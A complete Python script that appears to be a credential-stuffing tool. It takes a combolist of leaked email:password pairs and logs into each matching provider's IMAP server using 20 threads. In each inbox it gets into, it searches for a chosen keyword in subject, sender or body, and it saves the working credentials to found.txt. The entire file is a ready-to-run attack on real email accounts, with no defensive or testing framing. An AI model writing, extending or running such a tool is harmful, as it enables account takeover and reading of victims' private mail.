import imaplib
import json
import argparse
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from termcolor import colored
import random
from datetime import datetime

# Number of threads
NUM_WORKERS = 20

def load_config():
    with open('config.json', 'r') as file:
        return json.load(file)

def find_server_settings(email, config):
    domain = email.split('@')[-1]
    for provider in config:
        if domain in provider["Domains"]:
            return provider
    return None

def check_email(email, password, search_criteria, server_settings):
    try:
        with imaplib.IMAP4_SSL(server_settings['Hostname'], server_settings['Port'], timeout=10) as mail:
            mail.login(email, password)
            mail.select('inbox')
            result, data = mail.search(None, search_criteria)
        if data[0]:
            logging.info(colored(f"Hit {email}:{password}", 'green'))
            return f"{email}:{password}"
    except Exception as e:
        logging.debug(f"Failed to check {email}: {str(e)}")
    return None

def process_combolist(combolist_file, search_criteria, num_threads):
    config = load_config()
    results = []

    def process_line(line):
        if ':' in line:
            try:
                email, password = line.strip().split(':')
                settings = find_server_settings(email, config)
                if settings:
                    return check_email(email, password, search_criteria, settings)
            except ValueError:
                pass
        return None

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        with open(combolist_file, 'r') as file:
            futures = [executor.submit(process_line, line) for line in file]
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

    # Save found emails and passwords
    with open('found.txt', 'a') as f:
        for result in results:
            f.write(result + '\n')

def main():
    parser = argparse.ArgumentParser(description="Search emails based on specified criteria.")
    parser.add_argument("combolist", help="Path to the combolist file")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads to use (default: 20)")
    parser.add_argument("--search-in", choices=['subject', 'from', 'body'], required=True, help="Where to search: subject, from (sender), or body")
    parser.add_argument("--keyword", required=True, help="Keyword to search for")
    parser.add_argument("--since", help="Minimum date (format: DD-Mon-YYYY, e.g., 01-Jan-2024)")

    args = parser.parse_args()

    # Construct the search criteria
    search_criteria = []
    if args.search_in == 'subject':
        search_criteria.append(f'(SUBJECT "{args.keyword}")')
    elif args.search_in == 'from':
        search_criteria.append(f'(FROM "{args.keyword}")')
    else:  # body
        search_criteria.append(f'(BODY "{args.keyword}")')

    if args.since:
        try:
            datetime.strptime(args.since, "%d-%b-%Y")
            search_criteria.append(f'(SINCE "{args.since}")')
        except ValueError:
            print("Invalid date format. Please use DD-Mon-YYYY (e.g., 01-Jan-2024)")
            return

    search_criteria = ' '.join(search_criteria)

    # Read the combolist into a list
    with open(args.combolist, 'r') as f:
        combolist = f.readlines()

    # Shuffle the combolist
    random.shuffle(combolist)

    # Write the shuffled combolist back to the file
    with open(args.combolist, 'w') as f:
        f.writelines(combolist)

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    process_combolist(args.combolist, search_criteria, args.threads)

if __name__ == "__main__":
    main()